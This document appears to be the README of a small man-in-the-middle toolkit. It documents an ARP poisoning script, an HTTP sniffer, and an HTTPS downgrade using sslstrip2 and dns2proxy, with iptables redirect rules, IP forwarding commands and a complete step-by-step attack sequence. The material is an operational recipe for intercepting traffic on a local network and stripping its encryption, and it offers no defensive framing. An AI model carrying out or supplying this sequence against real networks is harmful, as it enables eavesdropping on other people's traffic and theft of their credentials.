# Simple Mitmf Framework

**Man-In-The-Middle** Software Made Using Scapy with Python3

## Installing Required Packages:
```
- pip3 install scapy
- pip3 install scapy_http

OR 

- pip3 install -r requirements.txt
```
## IP Forward 

```
- echo 1 > /proc/sys/net/ipv4/ip_forward
```



# Arp_Poison.py

>- Performs **ARP Poisoning** by Sending ARP Packets.

## Kullanım :

```
- python3 arp_poison.py -t x.x.x.x -g x.x.x.x
```


# Listener.py

> - Captures and Prints All **HTTP** Packets After ARP Poisoning.

## Usage : 
```
- python3 listener.py -i wlan0
```

Instead of **Listener.py** You Can Use Any Network Listening Software. Ex: **Wireshark**

# Bypass HTTPS:

## Downloading Required Applications:

```
git clone https://github.com/byt3bl33d3r/sslstrip2
git clone https://github.com/singe/dns2proxy
```

## IP Table Configuration:

**For SSLStrip:**

```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```
**For DNS2Proxy:**
```
iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
```

## Usage : 
```
- echo 1 > /proc/sys/net/ipv4/ip_forward

- python3 arp_poison.py -t x.x.x.x -g x.x.x.x

- python3 sslstrip.py

- python3 dns2proxy.py

- python3 listener.py -i wlan0
